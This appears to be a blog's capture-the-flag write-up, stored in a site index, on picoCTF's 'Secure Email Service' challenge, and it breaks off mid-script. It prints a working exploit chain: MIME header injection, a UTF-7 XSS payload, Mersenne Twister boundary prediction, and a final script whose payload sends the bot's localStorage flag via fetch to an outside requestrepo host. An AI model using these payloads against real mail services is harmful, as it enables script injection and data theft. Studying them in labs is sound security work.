
[{"content":"","date":"25 March 2025","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","date":"25 March 2025","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"25 March 2025","externalUrl":null,"permalink":"/","section":"hibwyli","summary":"","title":"hibwyli","type":"page"},{"content":"","date":"25 March 2025","externalUrl":null,"permalink":"/authors/hibwyli/","section":"Authors","summary":"","title":"Hibwyli","type":"authors"},{"content":" Secure Email Service # This is the hardest web challenge from picoCTF. Knowledge : MIME email document structure, Signed Email, Header Injection, Breaking weak cryptography.\nFind the sink : # So the challenge gives us a bot with flag in localStorage and does some stuffs. from os import environ from playwright.async_api import async_playwright, expect import asyncio import re flag = environ.get(\u0026#39;FLAG\u0026#39;, \u0026#39;picoCTF{flag}\u0026#39;) password = environ.get(\u0026#39;PASSWORD\u0026#39;, \u0026#39;admin@ses\u0026#39;) async def bot(): async with asyncio.timeout(12): async with async_playwright() as p: browser = await p.chromium.launch() page = await browser.new_page() await page.goto(\u0026#39;http://127.0.0.1:8000\u0026#39;) await page.evaluate(\u0026#39;flag =\u0026gt; localStorage.setItem(\u0026#34;flag\u0026#34;, flag)\u0026#39;, flag) # login await page.type(\u0026#39;[name=username]\u0026#39;, \u0026#39;admin@ses\u0026#39;) await page.type(\u0026#39;[name=password]\u0026#39;, password) await page.click(\u0026#39;button\u0026#39;) # click on first email await page.wait_for_url(\u0026#39;http://127.0.0.1:8000/inbox.html\u0026#39;, wait_until=\u0026#39;networkidle\u0026#39;) try: await page.click(\u0026#39;tbody tr\u0026#39;, timeout=1000) except: await browser.close() return # click reply button await page.wait_for_url(\u0026#39;http://127.0.0.1:8000/email.html?id=*\u0026#39;, wait_until=\u0026#39;networkidle\u0026#39;) await expect(page.locator(\u0026#39;#reply\u0026#39;)).to_have_attribute(\u0026#39;href\u0026#39;, re.compile(\u0026#39;.*\u0026#39;)) await page.click(\u0026#39;#reply button\u0026#39;) # reply to email await page.wait_for_url(\u0026#39;http://127.0.0.1:8000/reply.html?id=*\u0026#39;, wait_until=\u0026#39;networkidle\u0026#39;) await page.type(\u0026#39;textarea\u0026#39;, \u0026#39;\\n\\n\u0026#39;.join([ \u0026#39;We\\\u0026#39;ve gotten your message and will respond soon.\u0026#39;, \u0026#39;Thank you for choosing SES!\u0026#39;, \u0026#39;Best regards,\u0026#39;, \u0026#39;The Secure Email Service Team\u0026#39; ])) await page.click(\u0026#39;#reply button\u0026#39;) await browser.close() asyncio.run(bot()) Bot actions :\nType admin email and password and login Then click into the first email and visit that email. After that it will reply that email So we must find some vulnerabilities in these action.\nHow the email looks like ? # Email from admin Email from user Looks like there is something difference here.Check the source code we find that. const parsed = await parse(msg.data); document.getElementById(\u0026#39;subject\u0026#39;).innerText = parsed.subject; const replyUrl = new URL(\u0026#39;/reply.html\u0026#39;, origin); replyUrl.searchParams.set(\u0026#39;id\u0026#39;, id); document.getElementById(\u0026#39;reply\u0026#39;).href = replyUrl; const content = document.getElementById(\u0026#39;content\u0026#39;); if (parsed.html) { const signed = await getSigned(msg.data, await rootCert()); if (signed) { const { html } = await parse(signed); const shadow = content.attachShadow({ mode: \u0026#39;closed\u0026#39; }); // Only sink ? shadow.innerHTML = `\u0026lt;style\u0026gt;:host { all: initial }\u0026lt;/style\u0026gt;${html}`; } else { content.style.color = \u0026#39;red\u0026#39;; content.innerText = \u0026#39;invalid signature!\u0026#39;; } } else { const pre = document.createElement(\u0026#39;pre\u0026#39;); pre.style.overflow = \u0026#39;auto\u0026#39;; pre.innerText = parsed.text; content.appendChild(pre); } There are 2 requirements for an email if I want it goes into the sink innerHTML : GOAL =\u0026gt; Create an email contains : # After parsed it contains html field . The msg.data is a valid data after signed with a key. Lets dig into the first requirement. # So how the parse works ? # Oh its look like using a parse.wasm file Which is too terrible to reverse and try to understand\u0026hellip;. After reading the write up I found a trick to check if it comes from any well known library by checking the registry. Now I can know that it uses the mail-parser-0.9.4 at this time. Note that its not the newest version so maybe we can find sth interesting\nBut we need a testing environment , so lets create some email based on context of this challenge . How the email generated from scratch ? # This code handles the flow :\n@app.post(\u0026#39;/api/send\u0026#39;) async def send( user: Annotated[User, Depends(db.request_user)], to: Annotated[str, Body()], subject: Annotated[str, Body()], body: Annotated[str, Body()] ): # make sure the email we\u0026#39;re sending to is valid recipient = await db.get_user(to) if len(user.public_key) == 0: # msg = util.generate_email( sender=user.username, recipient=recipient.username, subject=subject, content=body, ) else: # We control title through subject too msg = util.generate_email( sender=user.username, recipient=recipient.username, subject=subject, content=template.render( title=subject, content=body ), html=True, sign=True, cert=user.public_key, key=user.private_key ) email_id = str(uuid.uuid4()) await db.send_email(recipient, email_id, msg) return email_id And the code to generate the\ndef generate_email( sender: str, recipient: str, subject: str, content: str, html: bool = False, sign: bool = False, cert: str = \u0026#39;\u0026#39;, key: str = \u0026#39;\u0026#39;, ) -\u0026gt; str: msg = MIMEMultipart() msg[\u0026#39;From\u0026#39;] = sender msg[\u0026#39;To\u0026#39;] = recipient msg[\u0026#39;Subject\u0026#39;] = subject msg.attach(MIMEText(content)) if html: msg.attach(MIMEText(content, \u0026#39;html\u0026#39;))\tif sign: return smail.sign_message(msg, key.encode(), cert.encode()).as_string() return msg.as_string() We can see the difference at privileges here. Admin can create a HTML message ans Signed. But the most interesting part is the way it generates the content content=template.render( title=subject, content=body ), And actually its not too easy that the jinja2 cannot be SSTI or Escaped with xss but it should be paid attention\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;email-container\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;{{ title }}\u0026lt;/h1\u0026gt; \u0026lt;pre\u0026gt;{{ content }}\u0026lt;/pre\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; But it reads the title = subject and content = body. Try to figure out what we can control ? # So now we know that ONLY ADMIN can send an HTML valid email . Because the admin just send email from the reply.html so we just need to focus on this one . const parsed = await parse((await email(id)).data); const subject = `Re: ${parsed.subject}`; document.getElementById(\u0026#39;subject\u0026#39;).innerText = subject; document.getElementById(\u0026#39;reply\u0026#39;).onsubmit = async e =\u0026gt; { e.preventDefault(); const body = document.querySelector(\u0026#39;[name=body]\u0026#39;).value; try { // The destination go through parser first await send(parsed.from, subject, body); } catch(e) { alert(e); return; } First it parse of email and then : Send to parsed.from ? (but this is checked before the email sent to admin so we dont abuse this :v) With subject = parsed.subject ? Both of this is all from the user so lets test to find we can trick it or not. Example of email after parsed. Now we control the Subject right ? Try to inject the headers with Subject:abc\\nFrom:admin@ses Its not a dream ,btw :vv Lets try to audit the code to find the check\nPython looks like block it before . This regex detects lines that start with a non-space, non-tab sequence followed by a colon (:).\nSo we just need to add a space before the \u0026lsquo;:\u0026rsquo; to bypass\nNow get a new error check :D NEWLINE_WITHOUT_FWSP = re.compile(r\u0026#39;\\r\\n[^ \\t]|\\r[^ \\n\\t]|\\n[^ \\t]\u0026#39;) Now i cannot bypass this anymore\u0026hellip; seems a dead end .. Until i realize that Im using a different python version with the docker machine. Lets try again and this really works .Because there\u0026rsquo;s no check at python3.11 msg[\u0026#39;Subject\u0026#39;] = \u0026#34;HIHI\\nFrom :admin@ses\u0026#34; Progress # Now we can abuse the admin bot to send an email to itself !! and which it send to we still not control ? Or we did ? We have header injection which is too powerful , we can just put OUR EMAIL DATA into it ? But first calm down and think about the flow again now . FLOW EMAIL : # We send our subject -\u0026gt; Admin parse it and be abused to reply to itself -\u0026gt; It create a template with our subject -\u0026gt; It send the template . Admin visit the email itself and parse the msg.data -\u0026gt; check parsed -\u0026gt; check signed -\u0026gt; put into html or invalid siganture . - BTW , JUST DUMP ALL OUT ==========ADMIN RECEIVE THIS FROM USER============= Content-Type: multipart/mixed; boundary=\u0026#34;===============7785715794646824541==\u0026#34; MIME-Version: 1.0 From: user@ses To: admin@ses Subject: HIHI From :admin@ses --===============7785715794646824541== Content-Type: text/plain; charset=\u0026#34;us-ascii\u0026#34; MIME-Version: 1.0 Content-Transfer-Encoding: 7bit IM TOO DUMP BRO --===============7785715794646824541==-- ============AFTER PARSING======================= { \u0026#34;from\u0026#34;: \u0026#34;admin@ses\u0026#34;, \u0026#34;html\u0026#34;: null, \u0026#34;subject\u0026#34;: \u0026#34;HIHI\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;IM TOO DUMP BRO\u0026#34;, \u0026#34;to\u0026#34;: \u0026#34;admin@ses\u0026#34; } ==================== ADMIN WILL SIGN THIS ==================== ==================== PUT THE CONTENT=SUBJECT into JINJA======= Content-Type: multipart/mixed; boundary=\u0026#34;===============6803546522554613104==\u0026#34; MIME-Version: 1.0 From: admin@ses To: admin@ses Subject: Re: HIHI --===============6803546522554613104== Content-Type: text/plain; charset=\u0026#34;us-ascii\u0026#34; MIME-Version: 1.0 Content-Transfer-Encoding: 7bit \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;email-container\u0026#34;\u0026gt; ######THIS PLACE WE CONTROL ######### \u0026lt;h1\u0026gt;HIHI\u0026lt;/h1\u0026gt; ######THIS PLACE WE CONTROL ######### \u0026lt;pre\u0026gt;We\u0026amp;#39;ve gotten your message and will respond soon. Thank you for choosing SES! Best regards, The Secure Email Service Team\u0026lt;/pre\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; --===============6803546522554613104==-- ==================== ADMIN VISIT SECOND TIME AFTER PARSE==================== { \u0026#34;from\u0026#34;: \u0026#34;admin@ses\u0026#34;, \u0026#34;html\u0026#34;: null, \u0026#34;subject\u0026#34;: \u0026#34;Re: HIHI\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;\u0026lt;!DOCTYPE html\u0026gt;\\n\u0026lt;html\u0026gt;\\n\u0026lt;body\u0026gt;\\n \u0026lt;div class=\\\u0026#34;email-container\\\u0026#34;\u0026gt;\\n \u0026lt;h1\u0026gt;HIHI\u0026lt;/h1\u0026gt;\\n \u0026lt;pre\u0026gt;We\u0026amp;#39;ve gotten your message and will respond soon.\\n\\nThank you for choosing SES!\\n\\nBest regards,\\n\\nThe Secure Email Service Team\u0026lt;/pre\u0026gt;\\n \u0026lt;/div\u0026gt;\\n\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\u0026#34;, \u0026#34;to\u0026#34;: \u0026#34;admin@ses\u0026#34; } SO what if we must do someway to make the Subject after parsed contains something like : subject : \u0026#34;\\n----BOUND----\\n Content-Type:text/html\\n\\nPAYLOAD\\n---BOUND----\\n\u0026#34; ? The idea is INJECTING at the jinja point BUT HOW WE CAN REMAIN THE NEWLINE THROUGH PARSER? # After reading and finding how to add special bytes into headers I found that we can use ENCODING with special structure. def encode_base64(text): encoded_bytes = base64.b64encode(text.encode(\u0026#39;utf-8\u0026#39;)) return f\u0026#39;=?utf-8?B?{encoded_bytes.decode()}?=\u0026#39; You see , we keep the \u0026lsquo;\\n\u0026rsquo; remains which will jumped into the JINJA ? Result in the Resposne : Now we can modify the DATA ! But not really \u0026hellip;. The Boundary is RANDOM ? # If we want to modify this into valid email , we must someway choose the right boundary ? BUt keep it simple here we just try if our payload can work with fixed boundary or not ? Lets try with : payload = f\u0026#39;\\n--fixed2\\nContent-Type : text/html\\n\\n\u0026lt;img src=x onerror=alert()\u0026gt;\\n--fixed2\\n\u0026#39; msg[\u0026#39;Subject\u0026#39;] = f\u0026#34;HIHI{encode_base64(payload)}\\nFrom :admin@ses\u0026#34; It seem get escape ? Its no matter because MIME support ENCODING for data too , so just use UTF-7 ENCODING (THERE IS SOME BUG ON base64 encoding and I dont know the reason why ?) : payload = f\u0026#34;\u0026#34;\u0026#34;hi --==============={admin_boundary}== Content-Type : text/html; charset=utf-7 MIME-Version : 1.0 +ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-alert(1)+ADs-+ACA-/+AD4- --==============={admin_boundary}== \u0026#34;\u0026#34;\u0026#34; Now our dump will be like this :\n==================== ADMIN WILL SIGN THIS ==================== Content-Type: multipart/mixed; boundary=\u0026#34;===============adminone==\u0026#34; MIME-Version: 1.0 From: admin@ses To: admin@ses Subject: Re: HIHI hi --===============adminone== Content-Type : text/html; charset=utf-7 MIME-Version : 1.0 +ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-alert(1)+ADs-+ACA-/+AD4- --===============adminone== --===============adminone== Content-Type: text/plain; charset=\u0026#34;us-ascii\u0026#34; MIME-Version: 1.0 Content-Transfer-Encoding: 7bit \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;email-container\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;HIHI hi --===============adminone== Content-Type : text/html; charset=utf-7 MIME-Version : 1.0 +ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-alert(1)+ADs-+ACA-/+AD4- --===============adminone== \u0026lt;/h1\u0026gt; \u0026lt;pre\u0026gt;We\u0026amp;#39;ve gotten your message and will respond soon. Thank you for choosing SES! Best regards, The Secure Email Service Team\u0026lt;/pre\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; --===============adminone==-- ==================== ADMIN VISIT SECOND TIME AFTER PARSE==================== { \u0026#34;from\u0026#34;: \u0026#34;admin@ses\u0026#34;, \u0026#34;html\u0026#34;: \u0026#34;--===============adminone==\\nContent-Type: text/plain; charset=\\\u0026#34;us-ascii\\\u0026#34;\\nMIME-Version: 1.0\\nContent-Transfer-Encoding: 7bit\\n\\n\u0026lt;!DOCTYPE html\u0026gt;\\n\u0026lt;html\u0026gt;\\n\u0026lt;body\u0026gt;\\n \u0026lt;div class=\\\u0026#34;email-container\\\u0026#34;\u0026gt;\\n \u0026lt;h1\u0026gt;HIHI hi\\n\\n--===============adminone==\\nContent-Type : text/html; charset=utf-7\\nMIME-Version : 1.0\\n\\n\u0026lt;img src=\\\u0026#34;x\\\u0026#34; onerror=alert(1); /\u0026gt;\\n--===============adminone==\\n\u0026lt;/h1\u0026gt;\\n \u0026lt;pre\u0026gt;We\u0026amp;#39;ve gotten your message and will respond soon.\\n\\nThank you for choosing SES!\\n\\nBest regards,\\n\\nThe Secure Email Service Team\u0026lt;/pre\u0026gt;\\n \u0026lt;/div\u0026gt;\\n\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\\n--===============adminone==--\\n\u0026#34;, \u0026#34;subject\u0026#34;: \u0026#34;Re: HIHI hi\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;--===============adminone==\\nContent-Type: text/plain; charset=\\\u0026#34;us-ascii\\\u0026#34;\\nMIME-Version: 1.0\\nContent-Transfer-Encoding: 7bit\\n\\n\u0026lt;!DOCTYPE html\u0026gt;\\n\u0026lt;html\u0026gt;\\n\u0026lt;body\u0026gt;\\n \u0026lt;div class=\\\u0026#34;email-container\\\u0026#34;\u0026gt;\\n \u0026lt;h1\u0026gt;HIHI hi\\n\\n--===============adminone==\\nContent-Type : text/html; charset=utf-7\\nMIME-Version : 1.0\\n\\n\u0026lt;img src=\\\u0026#34;x\\\u0026#34; onerror=alert(1); /\u0026gt;\\n--===============adminone==\\n\u0026lt;/h1\u0026gt;\\n \u0026lt;pre\u0026gt;We\u0026amp;#39;ve gotten your message and will respond soon.\\n\\nThank you for choosing SES!\\n\\nBest regards,\\n\\nThe Secure Email Service Team\u0026lt;/pre\u0026gt;\\n \u0026lt;/div\u0026gt;\\n\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\\n--===============adminone==--\\n\u0026#34;, \u0026#34;to\u0026#34;: \u0026#34;admin@ses\u0026#34; } But after parsed it still not work ? After dynamically testing , i realize that this part make the parser error because its cannot understand the structure due to this point :\nSubject: Re: HIHI hi --===============adminone== Content-Type : text/html; charset=utf-7 MIME-Version : 1.0 +ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-alert(1)+ADs-+ACA-/+AD4- --===============adminone== THIS CONFUSE THE PARSER --===============adminone== Content-Type: text/plain; charset=\u0026#34;us-ascii\u0026#34; MIME-Version: 1.0 Content-Transfer-Encoding: 7bit But no matters , try it on server to understand why . WHAT HAPPENING HERE ? # Wait what ? Its so non sense right ? But we must remember that , our data will be SIGNED before being parsed !! Here is the real message after signed !! And message is sent by admin so the check signed must be valid because admin does it . Content-Type: multipart/signed; protocol=\u0026#34;application/pkcs7-signature\u0026#34;; micalg=\u0026#34;sha-256\u0026#34;; boundary=\u0026#34;===============admin2==\u0026#34; MIME-Version: 1.0 From: admin@ses To: admin@ses Subject: Re: hi hi --===============adminone== Content-Type : text/html; charset=utf-7 MIME-Version : 1.0 +ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-alert(1)+ADs-+ACA-/+AD4- --===============adminone== ### THIS PART IS ADDED INTO BETWEEN SUBJECT AND OUR DATA MAKES IT VALID BECAUSE IT DEFINED A BOUNDARY AGAIN :VV ### This is an S/MIME signed message --===============admin2== Content-Type: multipart/mixed; boundary=\u0026#34;===============adminone==\u0026#34; MIME-Version: 1.0 --===============adminone== Content-Type: text/plain; charset=\u0026#34;us-ascii\u0026#34; MIME-Version: 1.0 Content-Transfer-Encoding: 7bit \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;email-container\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Re: hi hi --===============adminone== Content-Type : text/html; charset=utf-7 MIME-Version : 1.0 +ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-alert(1)+ADs-+ACA-/+AD4- --===============adminone== \u0026lt;/h1\u0026gt; \u0026lt;pre\u0026gt;dsad\u0026lt;/pre\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; --===============adminone== Content-Type: text/html; charset=\u0026#34;us-ascii\u0026#34; MIME-Version: 1.0 Content-Transfer-Encoding: 7bit \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;email-container\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Re: hi hi --===============adminone== Content-Type : text/html; charset=utf-7 MIME-Version : 1.0 +ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-alert(1)+ADs-+ACA-/+AD4- --===============adminone== \u0026lt;/h1\u0026gt; \u0026lt;pre\u0026gt;dsad\u0026lt;/pre\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; --===============adminone==-- --===============admin2== Content-Type: application/pkcs7-signature; name=\u0026#34;smime.p7s\u0026#34; Content-Transfer-Encoding: base64 Content-Disposition: attachment; filename=\u0026#34;smime.p7s\u0026#34; Content-Description: S/MIME Cryptographic Signature MIIFLQYJKoZIhvcNAQcCoIIFHjCCBRoCAQExDzANBglghkgBZQMEAgEFADALBgkqhkiG9w0BBwGg ggMlMIIDITCCAgmgAwIBAgIUHjR1RUpDc9PN3lIb5uOKlA9XHXMwDQYJKoZIhvcNAQELBQAwHjEc MBoGA1UEAwwTc2VjdXJlLW1haWwtc2VydmljZTAeFw0yNTAzMjUwODU2NTFaFw0yNjAzMjUwODU2 NTFaMC4xEjAQBgNVBAMMCWFkbWluQHNlczEYMBYGCSqGSIb3DQEJARYJYWRtaW5Ac2VzMIIBIjAN BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtUWmhBhA9+K8pt1LEQx7SD0U+lrEyJjf0WdLX2Ht 4x12eWUN1cAzx/CqH3AUp+cRfBG42CFKT+TTrjz9K8nffUqhhOQpIQ4QtwhwWtHwjaBhRDKwo8mW znr4/cYGdxTyQ+n2eBzFhdBOe5LsO3GLMqYnNFrCPLUHL3DIssOuRiZIdTBkrqeG44SrqWOXna7Z hGOCygabdTZL93ucA2tLbtgW8Zg2/QwwU7f0Xx7HqGKpl7+Prt27gM3bZBRPXT2NU96/eW32Pgq3 qo3rC5jUMo2X+yCDB1PaGvxmbK/HSqCxLORYiRbhPA9vIuX8kUWJf9dtThPrUhXk4T+r+HwxQQID AQABo0cwRTAUBgNVHREEDTALgQlhZG1pbkBzZXMwDgYDVR0PAQH/BAQDAgWgMB0GA1UdJQQWMBQG CCsGAQUFBwMCBggrBgEFBQcDBDANBgkqhkiG9w0BAQsFAAOCAQEAm8mM0x6Xgs8YchYjePkFSpJJ hQzzbhnuCGrOqTJxJqnN9BtfE8aoNxXlnaLl4V3QJHDa1OFGJjErXzvtWa2zGkJZYFRR3Y766rFS 1PngziYCYCYGlpuqm20y0CYAPctZ13TDLd0ZLHuqXdq1/rXo0fqacovPfEzTxcGZdaRufDg/kn1y zSdBbw8XRwomJgwa1H7P9skGmydU1ASMJVonZjw1MY5HQ9MuW6VtmHAMMmy6XzimO477NiigakTc xh+Juc+zXIoPHuH5wGj8gs2fiM99/GSjvJ+PndbBHxP4YlPKLqhfazv/jfpAM27FaT0V5+cKoRWB w84hrdqbfj4EhTGCAcwwggHIAgEBMDYwHjEcMBoGA1UEAwwTc2VjdXJlLW1haWwtc2VydmljZQIU HjR1RUpDc9PN3lIb5uOKlA9XHXMwDQYJYIZIAWUDBAIBBQCgaTAYBgkqhkiG9w0BCQMxCwYJKoZI hvcNAQcBMBwGCSqGSIb3DQEJBTEPFw0yNTAzMjUwOTI1MDRaMC8GCSqGSIb3DQEJBDEiBCCSFpTh K2LQn+v3iRjE7B+4JZVXzLtG4cDt2+/FZtRZ/TANBgkqhkiG9w0BAQEFAASCAQAQMSR1+i6O29/7 jPnuMcvBnD3eEtQSwxKlHVT/2+DxISVxPF7+YDG4TEwZbzSx43BsoVvI/dkak8nuRCdZoErvDU5V Fm50PYeXxAvU4SB4T/mxTyDgsPRe5uBzRKyS2b3Qk+93EFFNHi4PACCIphzL3Tzs2fujqZoiE/pY HFrQKhLqxx7EhxacyBdY82fJ6+/wk8hADBJ8mH3JsLktZQ7BRgsH32le1nJGgk5yBa13Uc5I//UE c/Oe3RqWxoJLzl7m4iL2EEs2Si1U0DqGgtr+MzoUMDA//v4p5W6RWBq5Qn3Lb3r21Zw3IRbcLVAw gu9g3l14WKYRtrY2WZ1eiyXr --===============admin2==-- YOu can see there is a part added between 2 boundary . Test it in local We now can confirm that really affects to the response .\nNOW WE CAN TRIGGER XSS , JUST ONE FINAL THINGS\u0026hellip; # So now we can trigger XSS with only FIXED BOUNDARY right ? So lets audit the code to check if we can predict or crack the random shitty. def _make_boundary(cls ,text=None): # Craft a random boundary. If text is given, ensure that the chosen # boundary doesn\u0026#39;t appear in the text. token = random.randrange(sys.maxsize) boundary = (\u0026#39;=\u0026#39; * 15) + (_fmt % token) + \u0026#39;==\u0026#39; if text is None: return boundary b = boundary counter = 0 while True: cre = cls._compile_re(\u0026#39;^--\u0026#39; + re.escape(b) + \u0026#39;(--)?$\u0026#39;, re.MULTILINE) if not cre.search(text): break b = boundary + \u0026#39;.\u0026#39; + str(counter) counter += 1 return b Im not too good at crypto so I just know there is a tool to crack it by collecting too much boundaries and predict . Here is the script\ndef get_boundary(s) -\u0026gt; int: data = { \u0026#34;to\u0026#34;: \u0026#34;user@ses\u0026#34;, \u0026#34;subject\u0026#34;: \u0026#39;hi\u0026#39;, \u0026#34;body\u0026#34;: \u0026#34;faewfef\u0026#34; } res = s.post(url+\u0026#39;/api/send\u0026#39;,json = data,headers=headers) print(res.text) a = res.text.strip(\u0026#39;\u0026#34;\u0026#39;) # Remove surrounding quotes res = s.get(url+\u0026#39;/api/email/\u0026#39;+a,json = data,headers=headers) boundary = re.findall(r\u0026#34;===============(\\d+)==\u0026#34;,res.json().get(\u0026#39;data\u0026#39;))[0] return int(boundary) import randCracker # https://github.com/icemonster/symbolic_mersenne_cracker/blob/main/main.py def error(text): print(f\u0026#34;[\\x1b[41mERROR\\x1b[0m] {text}\u0026#34;) sys.exit() def info(text): print(f\u0026#34;[\\x1b[32;1m+\\x1b[0m] {text}\u0026#34;) ut = randCracker.Untwister() for _ in range(800): b = bin(get_boundary(s))[2:].zfill(63) half1, half2 = b[:31], b[31:] half1 = half1 + \u0026#39;?\u0026#39; ut.submit(half2) ut.submit(half1) r2 = ut.get_random() # Let\u0026#39;s send one more email to ourself and see if our prediction\u0026#39;s correct. info(\u0026#34;State solved!\u0026#34;) if r2.getrandbits(63) == get_boundary(s) else error(\u0026#34;Boundary prediction failed.\u0026#34;) _ = r2.getrandbits(63) # skip over the email we send print(\u0026#34;CURRENT MUST BE \u0026#34;,_) # Admin\u0026#39;s boundary string! converted_num = str(int(r2.getrandbits(63))) # Convert to int and back to string smileBOundary = converted_num print(f\u0026#34;THIS IS SMILE SIGN BOUNDARY : {smileBOundary}\u0026#34;) admin_boundary = \u0026#39;%019d\u0026#39; % r2.getrandbits(63) print(f\u0026#34;THIS MUST BE RIGHT : {admin_boundary}\u0026#34;) print(f\u0026#34;FOUNDDDDDDDDDDDD next: {r2.getrandbits(63)}\u0026#34;) print(f\u0026#34;FOUNDDDDDDDDDDDD next: {r2.getrandbits(63)}\u0026#34;) FINAL PROBLEM # Now we simply use the predicted boundary and get flag right ? What happening to our boundary ? It adds .0 after ? Look at the make_boundary to understand why def _make_boundary(cls ,text=None): # Craft a random boundary. If text is given, ensure that the chosen # boundary doesn\u0026#39;t appear in the text. token = random.randrange(sys.maxsize) boundary = (\u0026#39;=\u0026#39; * 15) + (_fmt % token) + \u0026#39;==\u0026#39; if text is None: return boundary b = boundary counter = 0 while True: cre = cls._compile_re(\u0026#39;^--\u0026#39; + re.escape(b) + \u0026#39;(--)?$\u0026#39;, re.MULTILINE) if not cre.search(text): break b = boundary + \u0026#39;.\u0026#39; + str(counter) counter += 1 return b ```python cre = cls._compile_re(\u0026#39;^--\u0026#39; + re.escape(b) + \u0026#39;(--)?$\u0026#39;, re.MULTILINE) This regrex just check the \u0026lsquo;\u0026ndash;\u0026rsquo; start at the beginning, a space can bypass ? And the parser will still understand\u0026hellip;(ned audit too..) HERE WE GET ITTTTTT !!!!! FINAL SCRIPT # import requests import sys import re import base64 s = requests.Session() url = \u0026#34;http://localhost:8001\u0026#34; data = { \u0026#34;username\u0026#34;:\u0026#34;user@ses\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;50d93cda66e45ffc3c57623a14af2cc7\u0026#34; } res= requests.post(url+\u0026#39;/api/login\u0026#39;,json=data) clean_hex = res.text.strip(\u0026#39;\u0026#34;\u0026#39;) # Remove surrounding quotes headers = { \u0026#39;Token\u0026#39;: clean_hex } print(res.text) def encode_base64(text): encoded_bytes = base64.b64encode(text.encode(\u0026#39;utf-8\u0026#39;)) return f\u0026#39;=?utf-8?B?{encoded_bytes.decode()}?=\u0026#39; boundary = \u0026#34;===============adminone==\u0026#34; def get_boundary(s) -\u0026gt; int: data = { \u0026#34;to\u0026#34;: \u0026#34;user@ses\u0026#34;, \u0026#34;subject\u0026#34;: \u0026#39;hi\u0026#39;, \u0026#34;body\u0026#34;: \u0026#34;faewfef\u0026#34; } res = s.post(url+\u0026#39;/api/send\u0026#39;,json = data,headers=headers) print(res.text) a = res.text.strip(\u0026#39;\u0026#34;\u0026#39;) # Remove surrounding quotes res = s.get(url+\u0026#39;/api/email/\u0026#39;+a,json = data,headers=headers) boundary = re.findall(r\u0026#34;===============(\\d+)==\u0026#34;,res.json().get(\u0026#39;data\u0026#39;))[0] return int(boundary) import randCracker # https://github.com/icemonster/symbolic_mersenne_cracker/blob/main/main.py def error(text): print(f\u0026#34;[\\x1b[41mERROR\\x1b[0m] {text}\u0026#34;) sys.exit() def info(text): print(f\u0026#34;[\\x1b[32;1m+\\x1b[0m] {text}\u0026#34;) ut = randCracker.Untwister() for _ in range(800): b = bin(get_boundary(s))[2:].zfill(63) half1, half2 = b[:31], b[31:] half1 = half1 + \u0026#39;?\u0026#39; ut.submit(half2) ut.submit(half1) r2 = ut.get_random() # Let\u0026#39;s send one more email to ourself and see if our prediction\u0026#39;s correct. info(\u0026#34;State solved!\u0026#34;) if r2.getrandbits(63) == get_boundary(s) else error(\u0026#34;Boundary prediction failed.\u0026#34;) _ = r2.getrandbits(63) # skip over the email we send print(\u0026#34;CURRENT MUST BE \u0026#34;,_) # Admin\u0026#39;s boundary string! admin_boundary = \u0026#39;%019d\u0026#39; % r2.getrandbits(63) print(f\u0026#34;THIS MUST BE RIGHT : {admin_boundary}\u0026#34;) print(f\u0026#34;THIS IS OF SMILE KK: {r2.getrandbits(63)}\u0026#34;) print(f\u0026#34;FOUNDDDDDDDDDDDD next: {r2.getrandbits(63)}\u0026#34;) script = base64.b64encode(\u0026#34;fetch(\u0026#39;https://vqbe0frw.requestrepo.com/?q=\u0026#39;+localStorage.getItem(\u0026#39;flag\u0026#39;))\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)).decode(\u0026#39;utf-8\u0026#39;).replace(\u0026#39;=\u0026#39;,\u0026#39;+AD0-\u0026#39;) print(script) payload = f\u0026#34;\u0026#34;\u0026#34;hi --==============={admin_boundary}== Content-Type : text/html; charset=utf-7 MIME-Version : 1.0 +ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-eval(atob(\u0026#39;{script}\u0026#39;))+ADs-+ACA-/+AD4- --==============={admin_boundary}== \u0026#34;\u0026#34;\u0026#34; final_payload = f\u0026#39;hi=?ISO-8859-1?B?{base64.b64encode(payload.encode()).decode()}?=\\nFrom : 